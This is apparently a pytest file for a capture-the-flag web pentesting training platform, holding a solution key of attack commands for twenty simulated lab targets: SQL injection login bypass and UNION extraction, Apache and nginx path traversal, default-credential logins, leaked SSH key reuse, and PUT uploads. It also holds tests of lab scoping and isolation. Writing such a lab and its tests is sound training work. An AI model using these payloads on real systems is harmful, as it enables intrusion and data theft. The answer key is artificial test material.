"""Exercise every EWPT target through the authenticated terminal and scoring API."""
import re

import pytest

from conftest import auth_headers, register, start_lab, submit_flag
from app.labs.ewpt import TARGETS

FLAG = re.compile(r'MYCTF\{(?!\.\.\.)[^}]+\}')
SLUGS = {
    101: 'fuzz-the-login', 102: 'http-method-mayhem', 103: 'coupon-king',
    104: 'vendor-osint', 105: 'fastapi-docs-leak', 106: 'stack-fingerprint',
    107: 'apache-2449-traversal', 108: 'tomcat-weak-creds',
    109: 'nginx-alias-traversal', 110: 'dns-enumeration', 111: 'ssh-key-leak',
    112: 'xrdp-exposure', 113: 'digest-auth-realm', 114: 'backup-file-leak',
    115: 'api-endpoint-fuzzing', 116: 'password-reset-step-skip',
    117: 'architecture-mapping-quiz', 118: 'log-analysis-fuzzing',
    119: 'sqli-via-fuzzing', 120: 'http-trace-leak',
}


def sh(client, token, iid, command):
    response = client.post(f'/labs/{iid}/shell', headers=auth_headers(token), json={'command': command})
    assert response.status_code == 200, response.get_data(as_text=True)
    data = response.get_json()
    assert not data.get('stderr'), data
    return data['stdout']


SOLUTIONS = {
    101: ['curl -i http://login.lab.local/api/login -d "username=\' OR 1=1-- -&password=x" -c cookies.txt',
          'curl -b cookies.txt http://login.lab.local/admin'],
    102: ['curl -X OPTIONS http://methods.lab.local/uploads/', 'curl -X PUT --data owned http://methods.lab.local/uploads/probe.txt',
          'curl http://methods.lab.local/uploads/probe.txt'],
    103: ['curl -d quantity=-1 http://shop.lab.local/cart', 'curl -X POST http://shop.lab.local/checkout'],
    104: ['curl http://osint.lab.local/lumoratech.html', 'answer maintenance_and_support'],
    105: ['curl http://api.lab.local:8000/openapi.json', 'curl -H "X-Admin: true" http://api.lab.local:8000/api/v1/admin/flag'],
    106: ['curl http://flask.lab.local/robots.txt', 'curl http://flask.lab.local/backup/app.py', 'curl -H "X-Debug: 1" http://flask.lab.local/flag'],
    107: ['curl --path-as-is http://cms.lab.local:8082/cgi-bin/.%2e/.%2e/.%2e/.%2e/flag.txt'],
    108: ['curl -u tomcat:tomcat http://tomcat.lab.local:8080/manager/html'],
    109: ['curl --path-as-is http://nginx.lab.local:5000/static../flag.txt'],
    110: ['dig @192.168.0.2 version.bind CH TXT', 'dig TXT flag.lumoratech.lab @192.168.0.2'],
    111: ['curl -O http://ssh.lab.local/backup/id_rsa', 'chmod 600 id_rsa', 'ssh -i id_rsa ctf@ssh.lab.local', 'cat /home/ctf/flag.txt'],
    112: ['xfreerdp /v:xrdp.lab.local /u:ctf /p:ctf', 'cat ~/Desktop/flag.txt'],
    113: ['curl --digest -u admin:admin http://digest.lab.local/flag'],
    114: ['curl -O http://backup.lab.local/www.zip', 'unzip www.zip', 'cat www/.env', 'cat www/flag.txt'],
    115: ['ffuf -u http://api-fuzz.lab.local/api/FUZZ -w api-wordlist.txt -mc 200,403', 'curl -H "X-Forwarded-For: 127.0.0.1" http://api-fuzz.lab.local/api/debug'],
    116: ['curl -d "email=admin@lab.local&password=NewPass123" http://reset.lab.local/reset/step3',
          'curl -c cookies.txt -d "email=admin@lab.local&password=NewPass123" http://reset.lab.local/api/login',
          'curl -b cookies.txt http://reset.lab.local/admin'],
    117: ['nmap -sV architecture.lab.local', 'answer nginx_uvicorn_tomcat_apache'],
    118: ["awk '{print $1}' access.log | sort | uniq -c | sort -nr", 'answer 192.168.0.66'],
    119: ['curl "http://sqli-fuzz.lab.local/product?id=-1%20UNION%20SELECT%201,2,flag%20FROM%20flags--%20-"'],
    120: ['curl -X OPTIONS http://trace.lab.local/', 'curl -X TRACE http://trace.lab.local/ -H "X-Test: flag"'],
}


@pytest.mark.parametrize('number', [n for n in TARGETS if n != 104])  # 104 is withdrawn
def test_ewpt_end_to_end(client, user, number):
    token, slug = user['token'], 'ewpt-' + SLUGS[number]
    detail = client.get('/api/challenges/' + slug, headers=auth_headers(token)).get_json()
    assert detail['is_shell'] and detail['has_lab']
    iid = start_lab(client, token, slug)
    for command in SOLUTIONS[number]: output = sh(client, token, iid, command)
    match = FLAG.search(output)
    assert match, output
    response = submit_flag(client, token, slug, match.group())
    assert response.status_code == 200, response.get_data(as_text=True)
    assert response.get_json()['correct']


@pytest.mark.parametrize('number,command', [
    (101, 'curl -i http://login.lab.local/admin'),
    (102, 'curl http://methods.lab.local/uploads/probe.txt'),
    (103, 'curl -X POST http://shop.lab.local/checkout'),
    (105, 'curl http://api.lab.local:8000/api/v1/admin/flag'),
    (106, 'curl http://flask.lab.local/flag'),
    (107, 'curl http://cms.lab.local:8082/flag.txt'),
    (108, 'curl -u tomcat:wrong http://tomcat.lab.local:8080/manager/html'),
    (109, 'curl http://nginx.lab.local:5000/flag.txt'),
    (110, 'dig @192.168.0.2 nonexistent.lab TXT'),
    (113, 'curl --digest -u admin:wrong http://digest.lab.local/flag'),
    (115, 'curl http://api-fuzz.lab.local/api/debug'),
    (116, 'curl -d "email=admin@lab.local&password=wrong" http://reset.lab.local/api/login'),
    (117, 'answer apache_tomcat_uvicorn_nginx'),
    (118, 'answer 192.168.0.10'),
    (119, 'curl "http://sqli-fuzz.lab.local/product?id=1"'),
    (120, 'curl http://trace.lab.local/'),
])
def test_ewpt_unsolved_requests_do_not_reveal_flag(client, user, number, command):
    iid = start_lab(client, user['token'], 'ewpt-' + SLUGS[number])
    assert not FLAG.search(sh(client, user['token'], iid, command))


def test_fuzzing_uses_actual_wordlist_and_response_filters(client, user):
    token = user['token']; iid = start_lab(client, token, 'ewpt-fuzz-the-login')
    out = sh(client, token, iid, 'ffuf -u http://login.lab.local/api/login -X POST -d "username=FUZZ&password=test" -w sqli-payloads.txt -mc 200')
    assert "' OR 1=1-- - [Status: 200" in out
    assert 'test [Status:' not in out and 'admin [Status:' not in out
    iid2 = start_lab(client, token, 'ewpt-sqli-via-fuzzing')
    out = sh(client, token, iid2, 'ffuf -u "http://sqli-fuzz.lab.local/product?id=FUZZ" -w sqli-payloads.txt -mc all')
    assert '1 ORDER BY 3-- - [Status: 200' in out
    assert '1 ORDER BY 4-- - [Status: 500' in out
    assert '-1 UNION SELECT 1,2,flag FROM flags-- - [Status: 200' in out


def test_ewpt_coupon_replay_and_json(client, user):
    token = user['token']; iid = start_lab(client, token, 'ewpt-coupon-king')
    for i in range(10):
        sh(client, token, iid, "curl --json '{\"coupon\":\"WELCOME10\"}' http://shop.lab.local/apply-coupon")
    assert FLAG.search(sh(client, token, iid, 'curl -X POST http://shop.lab.local/checkout'))


def test_ewpt_downloads_respect_cwd_and_require_authentication(client, user):
    token = user['token']; iid = start_lab(client, token, 'ewpt-ssh-key-leak')
    sh(client, token, iid, 'cd /')
    sh(client, token, iid, 'curl -o key http://ssh.lab.local/backup/id_rsa')
    assert 'SIMULATED-KEY' in sh(client, token, iid, 'cat /key')
    response = client.post(f'/labs/{iid}/shell', headers=auth_headers(token), json={'command': 'ssh -i key ctf@ssh.lab.local'}).get_json()
    assert 'UNPROTECTED' in response['stderr']
    assert 'No such file' in client.post(f'/labs/{iid}/shell', headers=auth_headers(token), json={'command': 'cat /home/ctf/flag.txt'}).get_json()['stderr']
    sh(client, token, iid, 'chmod 600 key')
    assert FLAG.search(sh(client, token, iid, 'ssh -i key ctf@ssh.lab.local cat /home/ctf/flag.txt'))


def test_ewpt_owner_scope_reset_and_fresh_flags(client, user):
    token, slug = user['token'], 'ewpt-http-method-mayhem'
    iid = start_lab(client, token, slug)
    for command in SOLUTIONS[102]: out = sh(client, token, iid, command)
    old_flag = FLAG.search(out).group()
    other = client.application.test_client(); _, other_token = register(other)
    response = other.post(f'/labs/{iid}/shell', headers=auth_headers(other_token), json={'command': 'ls'})
    assert response.status_code == 403
    second = start_lab(other, other_token, slug)
    assert not FLAG.search(sh(other, other_token, second, 'curl http://methods.lab.local/uploads/probe.txt'))
    blocked = client.post(f'/labs/{iid}/shell', headers=auth_headers(token), json={'command': 'curl http://example.com/'}).get_json()
    assert 'outside this lab scope' in blocked['stderr']
    response = client.post(f'/api/labs/{iid}/reset', headers=auth_headers(token))
    assert response.status_code == 200, response.get_data(as_text=True)
    fresh = response.get_json()['instance_id']
    assert not FLAG.search(sh(client, token, fresh, 'curl http://methods.lab.local/uploads/probe.txt'))
    for command in SOLUTIONS[102]: out = sh(client, token, fresh, command)
    assert FLAG.search(out).group() != old_flag
    assert submit_flag(client, token, slug, old_flag).get_json()['correct'] is False


def test_each_lab_ships_only_its_own_wordlists(client, user):
    token = user['token']
    def files(number):
        iid = start_lab(client, token, 'ewpt-' + SLUGS[number])
        return sh(client, token, iid, 'ls')
    assert 'sqli-payloads.txt' in files(101) and 'wordlist.txt' not in files(101)
    assert 'api-wordlist.txt' not in files(101)
    assert 'api-wordlist.txt' in files(115) and 'sqli-payloads.txt' not in files(115)
    assert 'scope.txt' not in files(101)


def test_scope_is_not_in_the_terminal_and_bare_method_curl_works(client, user):
    token = user['token']
    iid = start_lab(client, token, 'ewpt-http-method-mayhem')
    assert 'target.lab.local' not in sh(client, token, iid, 'cat README.txt')
    out = sh(client, token, iid, 'curl -i OPTIONS target.lab.local/uploads/')
    assert 'PUT' in out
